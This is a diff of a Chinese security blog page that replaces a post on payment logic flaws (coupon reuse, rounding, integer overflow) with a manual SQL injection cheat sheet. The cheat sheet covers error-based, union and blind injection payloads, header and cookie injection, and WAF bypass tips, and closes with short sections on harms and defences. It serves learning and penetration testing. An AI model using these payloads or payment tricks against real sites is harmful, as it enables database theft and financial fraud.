@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="逻辑漏洞, Vc鹏">
-    <meta name="description" content="逻辑漏洞支付逻辑漏洞：请求篡改  支付篡改 优惠券 数量篡改1.签约漏洞：月自动付费，第一个a手机点自动续费然后到支付页面，然后多个手机登录同一个账号进行相同操作，然后a手机进行支付签约，成功后在第三方应用解除自动续费。替他手机也进行相同操">
+    <meta name="keywords" content="sql注入手工检测, Vc鹏">
+    <meta name="description" content="sql注入一般步骤1.判断数字型，字符型  两者最主要的差别在于字符型注入需要闭合引号.2.’有报错信息，用报错注入3.1’ and ‘1’&amp;#x3D;’1   1’ and ‘1’&amp;#x3D;’2看回显，回显不同使用联合。4.无报错，使用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +19,7 @@
 
     
 
-    <title>逻辑漏洞 | Vc鹏</title>
+    <title>sql注入手工检测 | Vc鹏</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">逻辑漏洞</h1>
+                    <h1 class="description center-align post-title">sql注入手工检测</h1>
                 </div>
             </div>
         </div>
@@ -442,7 +442,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-04-14
+                    2022-05-26
                 </div>
                 
 
@@ -463,8 +463,39 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="支付逻辑漏洞：请求篡改-支付篡改-优惠券-数量篡改"><a href="#支付逻辑漏洞：请求篡改-支付篡改-优惠券-数量篡改" class="headerlink" title="支付逻辑漏洞：请求篡改  支付篡改 优惠券 数量篡改"></a>支付逻辑漏洞：请求篡改  支付篡改 优惠券 数量篡改</h2><p>1.签约漏洞：<br>月自动付费，第一个a手机点自动续费然后到支付页面，然后多个手机登录同一个账号进行相同操作，然后a手机进行支付签约，成功后在第三方应用解除自动续费。替他手机也进行相同操作，由于都是提前打开了支付页面，所以付费金额都是享受到了新用户首月优惠的金额。前提是用户本身就是新用户。 原理是提前到下单支付页面， 如果不提前到下单支付页面在次下单是不允许的。<br>比较容易出现在活动页面的会员优惠开通。<br>2.会员升级：<br>手机a开通会员后，进行升级为超级会员的操作，这时候只需要花补差价的钱，到支付页面，用手机b登录相同账号进行开通超级会员，进入到升级页面，所以只需要花补差价的钱，然后a,b手机进行支付，第二个超会只花了补差价的钱。原理都是提前到支付页面 变相的创建变相订单。<br>程序是在支付后进行校验的<br>3.订单关闭：很少<br>使用优惠券创建订单，停留在支付页面，比如微信扫描但是不支付，然后关闭订单，发现优惠券返还了，然后使用优惠券在此创建订单，把第一个未支付的订单进行支付。发现订单到了发货状态，这种情况就是可以优惠券无限使用，尤其是金额比较大的优惠券，金额就比较大了。<br>4.并发<br>5.支付金额：分后面是厘0.019&#x3D;0.02  支付金额0.019，但是微信付款只有分钱，支付为0.01，但是服务器上是支付0.019的，还有服务器是四舍五入的显示为0.02. 数量特别大的话钱也挺多的。<br>6.数量溢出<br>int范围：-2147483648~2147483647<br>当支付金额为2147483649 时就变为了1<br>也可以把商品数量增加把价钱增加到2147483649</p>
-<p><em>无论做什么都不要给自己设限，加油！</em></p>
+                <h2 id="sql注入一般步骤"><a href="#sql注入一般步骤" class="headerlink" title="sql注入一般步骤"></a>sql注入一般步骤</h2><p>1.判断数字型，字符型  两者最主要的差别在于字符型注入需要闭合引号.<br>2.’有报错信息，用报错注入<br>3.1’ and ‘1’&#x3D;’1   1’ and ‘1’&#x3D;’2看回显，回显不同使用联合。<br>4.无报错，使用盲注，根据注入执行结果的布尔值(true,或false)，页面显示不同，使用布尔盲注。就是判断注入的结果。<br>1’ and ‘10’&#x3D;’10   1’ and ‘1’&#x3D;’2<br>5.注入结果不会被输出，并且不管注入成功还是失败都无任何回显，使用时间盲注。</p>
+<h2 id="常见的检测语法"><a href="#常见的检测语法" class="headerlink" title="常见的检测语法"></a>常见的检测语法</h2><ol>
+<li>‘ or ‘1’ &#x3D; ‘1</li>
+<li>‘ and 1&#x3D;1#</li>
+<li>‘and(select*from(select+sleep(0))a+union+select+1)&#x3D;’</li>
+<li>‘ || 1&#x3D;1#  ‘ || 1&#x3D;2# (看页面和数据包变化)</li>
+<li>|1&#x2F;(if(1&#x3D;2,1,exp(710)))|<br>get请求 –+  post请求 #<br>一.url<br>and updatexml(1,concat(0x7e,(select database()),0x7e),1)<br>and updatexml(200,concat(0x7e,version()),0x7e),100) –+</li>
+</ol>
+<p>空格–%0a 代替 绕waf</p>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="ONe-显注：报错和-联合-有报错信息-当union前面的语句为false时才会执行后面语句"><a href="#ONe-显注：报错和-联合-有报错信息-当union前面的语句为false时才会执行后面语句" class="headerlink" title="ONe:显注：报错和  联合:有报错信息  当union前面的语句为false时才会执行后面语句"></a>ONe:显注：报错和  联合:有报错信息  当union前面的语句为false时才会执行后面语句</h3><p>1’ and ‘1’&#x3D;’1   1’ and ‘1’&#x3D;’2看回显，回显不同使用显注。<br>1.先找闭合字符，一直使用#进行闭合符号的寻找。 有可能有过滤 ‘ or ‘1’ &#x3D; ‘1    ‘|| 1&#x3D;1#  ‘|| 1&#x3D;2# (看页面变化)  |1&#x2F;(if(1&#x3D;2,1,exp(710)))<br>or–||  #–%23   sleep()–mid()   and–&amp;&amp;  ‘–%27   + - * &#x2F;    </p>
+<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>搜索型：演示%’ union    and ‘%’ &#x3D;’<br>编码 加密<br>json     {“username”:”admin”}– {“username”:”admin’ order by 3#”}  {“username”:”admin’ and 1&#x3D;2 union select 1,2,3#”}<br>宽字节：id &#x3D; 1%df’<br>2.order by 猜字段<br>3.根据猜到的字段数 id&#x3D;1 and 1&#x3D;2 union select </p>
+<p>id&#x3D;1’)|1&#x2F;(if(1&#x3D;2,1,exp(710)))|’(               |sleep(2),floor(),version()|</p>
+<h3 id="TWO-盲注：注入结果无任何回显即是盲注-页面有变化-报文返回长度，时间等"><a href="#TWO-盲注：注入结果无任何回显即是盲注-页面有变化-报文返回长度，时间等" class="headerlink" title="TWO:盲注：注入结果无任何回显即是盲注 页面有变化 报文返回长度，时间等"></a>TWO:盲注：注入结果无任何回显即是盲注 页面有变化 报文返回长度，时间等</h3><p>and length(database())&#x3D;8 –+<br>and left(database(),1)&gt;’a’–+<br>and left(database(),2)&gt;’sa’–+</p>
+<p>第一个表的第一，二个字符。<br>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;101–+<br>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;109–+<br>时间盲注:适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索。在注入结果不会被输出，并且不管注入成功还是失败页面始终只有一个反应时<br>布尔盲注：根据注入执行结果的布尔值(true,或false)，页面显示不同，由此作为判断注入结果的依据即是布尔盲注<br>and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+   and ord(mid((select id from emails order by id limit 0,1),1,1))&lt;105 </p>
+<h3 id="THREE-POST注入"><a href="#THREE-POST注入" class="headerlink" title="THREE:POST注入"></a>THREE:POST注入</h3><p>‘) or (ord(substr(user(),1,1))&gt;1#<br>账号密码等。<br>and updatexml(1, concat(0x7e,(select distinct concat(0x7e,(select table_name),0x7e)from information_schema.tables where table_schema&#x3D;’security’ limit 0,1 ),0x7e),1)#</p>
+<p>1Referer：<br>2User-Agent: ‘ and updatexml(1,concat(0x7e,(select database())),1) and ‘1’ &#x3D;’1<br>3Cookie: uname&#x3D;admin’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)  #</p>
+<p>学会构造闭合 常见 ：’ “ ‘) “) ‘)) “))<br>and 1&#x2F;exp(710)  floor() updatexml() 报错函数</p>
+<p>id&#x3D;1’)–+   1’)  || ascii(substr(user(),1,1))&gt;97–+</p>
+<h4 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h4><p>xxx&#x2F;1234.html<br>xxx&#x2F;id&#x2F;123.html   xxx&#x2F;id&#x2F;123 and 1&#x3D;1.html（注入点）</p>
+<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>1.判断注入点，构造闭合，加上–+注释符闭合sql语句<br>2.fuzzsql关键字来判断waf规则<br>3.静态文件绕过  1.php&#x2F;test.css  改post  让网页布局改变<br>4.畸形协议 post改上传包  身体编码改变<br>5.enjoy表情<br>6.脏数据<br>7.关键字替换</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
+<li><p>盗取用户数据和隐私。</p>
+</li>
+<li><p>攻击者可对目标数据库进行“增删改查”，一旦攻击者删库，企业整个业务将陷于瘫痪，极难恢复。</p>
+</li>
+<li><p>植入网页木马程序，对网页进行篡改，发布一些违法犯罪信息。</p>
+</li>
+<li><p>攻击者添加管理员帐号。即便漏洞被修复，如果企业未及时察觉账号被添加，则攻击者可通过管理员帐号，进入网站后台。</p>
+</li>
+</ol>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>  首当其冲，应该提升开发人员的安全意识。许多针对web的攻击，都是由于开发人员安全意识薄弱造成的。其次，我们可以通过各种技术手段，防御SQL注入，例如用户权限管理、分级管理、参数传值、使用安全参数、漏洞扫描、多层验证、数据库信息加密等等。预编译：输入的一串，都被揉在一起，作一个参数值，而不是sql语句。</p>
+<h4 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h4><p>  高权限用户有读写 操作。<br>  DBA用户有管理MySQL中具体数据库(testdb)的权限；<br>  mysql root   mssql  sa  –iis.net asp,aspx<br>  mysql  @@version   db_name()  获取当前用户名：user,system_user,current_user</p>
+<h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><p>Access: and (select count(<em>) from MSysAccessObjects)&gt;0 返回正常说明是access and exists(select count(</em>) from 表)<br>SQLserver: and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql，这个表只有MSSQL数据库才有<br>MySQL: and length(user())&gt;0 返回正常说明是MySQL </p>
 
                 
             </div>
@@ -491,7 +522,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.vcpeng.top/2022/04/14/luo-ji-lou-dong/">http://www.vcpeng.top/2022/04/14/luo-ji-lou-dong/</a>
+                    <a href="http://www.vcpeng.top/2022/05/26/sql-zhu-ru-shou-gong-jian-ce/">http://www.vcpeng.top/2022/05/26/sql-zhu-ru-shou-gong-jian-ce/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -704,13 +735,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/05/26/sql-zhu-ru-shou-gong-jian-ce/">
+                <a href="/2022/05/26/luo-ji-lou-dong-zhi-mi-ma-zhao-hui/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sql注入手工检测">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="逻辑漏洞之密码找回">
                         
-                        <span class="card-title">sql注入手工检测</span>
+                        <span class="card-title">逻辑漏洞之密码找回</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -741,13 +772,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/06/jian-li-shu-yu-ni-zi-ji-de-bo-ke/">
+                <a href="/2022/04/14/luo-ji-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="建立属于你自己的博客">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="逻辑漏洞">
                         
-                        <span class="card-title">建立属于你自己的博客</span>
+                        <span class="card-title">逻辑漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -758,7 +789,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-14
                             </span>
                         <span class="publish-author">
                             
